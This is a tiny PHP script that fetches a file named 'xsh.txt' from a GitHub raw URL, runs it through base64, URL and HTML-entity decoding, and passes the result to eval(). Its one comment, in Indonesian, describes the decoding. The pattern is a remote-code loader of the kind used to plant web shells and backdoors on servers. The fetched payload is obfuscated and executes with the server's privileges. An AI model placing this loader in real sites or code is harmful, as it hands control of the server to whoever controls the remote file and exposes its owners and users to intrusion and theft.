<?php
$xsh = file_get_contents('https://raw.githubusercontent.com/khalemboy/x/main/xsh.txt');

// Decode teks menggunakan htmlspecialchars_decode, urldecode, dan base64_decode
eval(htmlspecialchars_decode(urldecode(base64_decode($xsh))));
?>
